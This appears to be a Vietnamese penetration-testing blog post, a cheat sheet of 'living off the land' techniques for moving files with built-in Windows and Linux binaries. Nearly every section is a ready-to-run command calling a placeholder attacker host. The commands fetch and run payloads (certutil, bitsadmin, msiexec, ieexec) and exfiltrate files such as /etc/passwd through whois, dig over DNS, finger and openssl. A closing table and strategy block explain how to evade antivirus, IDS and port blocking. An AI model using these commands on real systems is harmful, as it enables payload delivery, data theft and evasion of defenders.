---
title: "Living off the Land — File Transfer (LOLBins / GTFOBins)"
date: 2026-04-16 00:03:00 +0700
categories: [Pentest, File Transfer]
tags: [lolbins, gtfobins, living-off-the-land, evasion, windows, linux]
---

> **LOLBins (Living off the Land Binaries)** = tận dụng binary **có sẵn trên hệ thống** để thực hiện hành vi ngoài mục đích ban đầu.
> - Windows → [LOLBAS](https://lolbas-project.github.io)
> - Linux → [GTFOBins](https://gtfobins.github.io)
{: .prompt-info}

> **Tư duy cốt lõi:** Trước khi upload tool mới → hỏi: **"Binary nào đang có sẵn trên máy này làm được việc mình cần?"**
{: .prompt-tip}

---

## 🪟 Windows — LOLBAS

### certreq.exe — Upload file (exfiltration)

```cmd
# Attacker: lắng nghe
sudo nc -lvnp 8000

# Victim: gửi file
certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini
```

### certutil.exe — Download file

```cmd
certutil.exe -verifyctl -split -f http://<ATTACKER_IP>:8000/nc.exe
```

> AMSI hiện tại **đã detect** certutil usage → dễ bị flag. Biết để dùng khi cần, nhưng cân nhắc môi trường.
{: .prompt-warning}

### bitsadmin / BITS — Download file

```cmd
bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>:8000/nc.exe C:\Users\Public\nc.exe
```

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<ATTACKER_IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

> BITS là Windows Update service → ít bị nghi ngờ hơn so với certutil.
{: .prompt-tip}

### msiexec.exe — Download + Execute

```cmd
msiexec /q /i http://<ATTACKER_IP>:8000/payload.msi
```

### Desktopimgdownldr.exe — Download file

```cmd
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://<ATTACKER_IP>:8000/nc.exe /eventName:desktopimgdownldr
```

### ftp.exe — Scripted Download

```cmd
echo open <ATTACKER_IP> 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

### finger.exe — Exfiltration qua port 79

```cmd
finger user@<ATTACKER_IP>
```

### expand.exe — Copy file từ UNC path

```cmd
expand \\<ATTACKER_IP>\share\file.bat C:\Users\Public\file.bat
```

### makecab.exe — Đóng gói file trước khi exfil

```cmd
makecab C:\Users\Public\sensitive.txt C:\Users\Public\sensitive.cab
```

### ieexec.exe — Chạy app từ URL

```cmd
ieexec.exe http://<ATTACKER_IP>:8000/payload.exe
```

---

## 🐧 Linux — GTFOBins

### openssl — Encrypted transfer (TLS)

```bash
# Attacker: tạo certificate + dựng server
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Victim: download
openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
```

> Traffic được **mã hóa TLS** → IDS/IPS khó inspect nội dung.
{: .prompt-tip}

### Python / PHP / Ruby / Perl

```bash
# Python 3
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ATTACKER_IP>:8000/file', '/tmp/file')"

# PHP
php -r "file_put_contents('/tmp/file', file_get_contents('http://<ATTACKER_IP>:8000/file'));"

# Ruby
ruby -e "require 'net/http'; File.write('/tmp/file', Net::HTTP.get(URI('http://<ATTACKER_IP>:8000/file')))"

# Perl
perl -e "use LWP::Simple; getstore('http://<ATTACKER_IP>:8000/file', '/tmp/file');"
```

### awk — Mở TCP connection

```bash
awk 'BEGIN{s="/inet/tcp/0/<ATTACKER_IP>/8000"; while((s|&getline line)>0) print line; close(s)}'
```

### whois — Exfiltration

```bash
# Attacker: lắng nghe
nc -lvnp 4444

# Victim: gửi data
whois -h <ATTACKER_IP> -p 4444 `cat /etc/passwd`
```

### dig — Exfiltration qua DNS

```bash
dig @<ATTACKER_IP> -f /etc/passwd
```

> DNS (port 53) hiếm khi bị block → rất hữu ích khi outbound bị hạn chế.
{: .prompt-tip}

### base64 — Transfer qua bất kỳ text channel

```bash
# Victim: encode
base64 -w0 /etc/passwd

# Attacker: decode
echo "<base64_string>" | base64 -d > passwd
```

---

## Bảng tổng hợp

| Tool | OS | Chức năng | Ghi chú |
|---|---|---|---|
| `certreq.exe` | Windows | Upload/Exfil | HTTP POST |
| `certutil.exe` | Windows | Download | ⚠️ AMSI detect |
| `bitsadmin` / BITS | Windows | Download | Windows service hợp lệ |
| `msiexec.exe` | Windows | Download + Execute | |
| `desktopimgdownldr.exe` | Windows | Download | Ít phổ biến → ít bị chú ý |
| `ftp.exe` | Windows | Download | Scripted, anonymous |
| `finger.exe` | Windows | Exfil | Port 79 |
| `openssl` | Linux | Upload/Download | Encrypted TLS |
| `python/php/ruby/perl` | Linux | Download | Nếu interpreter có sẵn |
| `awk` | Linux | Download | TCP connection |
| `whois` | Linux | Exfil | Port 4444 |
| `dig` | Linux | Exfil | DNS port 53 |
| `base64` | Linux | Upload/Download | Mọi text channel |

---

## Chiến lược chọn kỹ thuật

```
Không có curl/wget?        → python, php, ruby, perl, awk
Bị block port thường?      → port 53 (DNS/dig), port 79 (finger), port 443 (openssl)
Cần tránh AV (Windows)?    → bitsadmin, desktopimgdownldr (tránh certutil)
Cần mã hóa traffic?        → openssl s_server/s_client
Chỉ có text channel?       → base64 encode → copy/paste → decode
```
